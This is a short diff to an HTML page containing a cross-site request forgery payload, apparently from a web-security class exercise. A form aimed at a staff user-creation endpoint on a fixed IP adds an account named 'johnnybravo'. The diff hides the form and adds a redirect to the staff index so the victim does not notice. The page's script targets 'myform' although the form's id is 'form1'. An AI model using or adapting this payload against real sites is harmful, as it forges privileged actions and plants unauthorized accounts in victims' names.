@@ -9,7 +9,7 @@
 </head>
 
 <body>
-    <form action="https://104.198.208.81/red/public/staff/users/new.php" id="form1" method="POST">
+    <form action="https://104.198.208.81/red/public/staff/users/new.php" style="display: none" id="form1" method="POST">
         <input name="first_name" value="Johnny">
         <input name="last_name" value="Bravo">
         <input name="username" value="johnnybravo">
@@ -20,6 +20,7 @@
     </form>
     <script>
         document.getElementById("myform").click();
+        document.location = "https://104.198.208.81/red/public/staff/index.php"
     </script>
 </body>
 
